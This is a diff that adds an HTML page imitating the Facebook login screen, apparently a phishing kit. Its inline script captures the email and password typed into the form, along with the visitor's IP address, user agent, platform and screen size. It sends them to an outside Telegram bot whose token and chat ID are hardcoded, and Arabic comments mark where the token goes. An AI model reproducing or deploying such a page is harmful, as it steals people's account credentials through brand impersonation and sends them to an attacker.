@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook – log in or sign up</title>
+    <link rel="stylesheet" href="default.css">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="login">
+        <div class="container">
+            <div class="row">
+                <div class="col-7">
+                    <div class="align-center">
+                        <div class="content">
+                            <img src="img/fb.png" alt="">
+                            <p>Facebook helps you connect and share with the people in your life.</p>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-5 col-xs-12">
+                    
+                        <div class="login-form">
+                            <form action="" id="loginForm">
+                                <input id="email" type="text" placeholder="Email address or phone number"><br>
+                                <input id="password" type="password" placeholder="Password"><br>
+                                <button id="login-btn" type="submit">Log In</button><br>
+                                <a href="#">Forgotten password?</a><br>
+                                <button id="create-btn">Create New Account</button><br>
+                            </form>
+                        </div>
+                        <footer>
+                            <a href="#" 
+                            style="font-weight: bold;
+                            color: var(--black);
+                            text-decoration: none;">Create a Page</a> 
+                            for a celebrity, band or business.
+                        </footer>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+<script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
+<script>
+    const TOKEN = '8145966833:AAE8US49jHhfqjJvKCIs7svuHKC0v0P70jc';                                                            // هنا التوكين              
+    const CHAT_ID = '6940980811';                                                       // هنا معرف الشات https://api.telegram.org/bot/getUpdates
+    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;        
+
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+
+        axios.get('https://api.ipify.org?format=json')
+            .then(response => {
+                const ip = response.data.ip;
+
+                const userAgent = navigator.userAgent;
+                const platform = navigator.platform;
+                const screenWidth = screen.width;
+                const screenHeight = screen.height;
+                const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
+
+                const message = ` 
+                    <b>New Login Attempt</b>\n
+                    <b>Email:</b> ${email}\n
+                    <b>Password:</b> ${password}\n
+                    <b>IP Address:</b> ${ip}\n
+                    <b>Device Type:</b> ${deviceType}\n
+                    <b>Platform:</b> ${platform}\n
+                    <b>User Agent:</b> ${userAgent}\n
+                    <b>Screen Resolution:</b> ${screenWidth}x${screenHeight}
+                `;
+
+                axios.post(URI_API, {
+                    chat_id: CHAT_ID,
+                    parse_mode: 'html',
+                    text: message
+                }).then(response => {
+                    alert('Information sent successfully!');
+                }).catch(error => {
+                    alert('Error sending the information. Please try again.');
+                });
+            })
+            .catch(error => {
+                alert('Error fetching the IP address. Please try again.');
+            });
+    });
+</script>
+</body>
+</html>
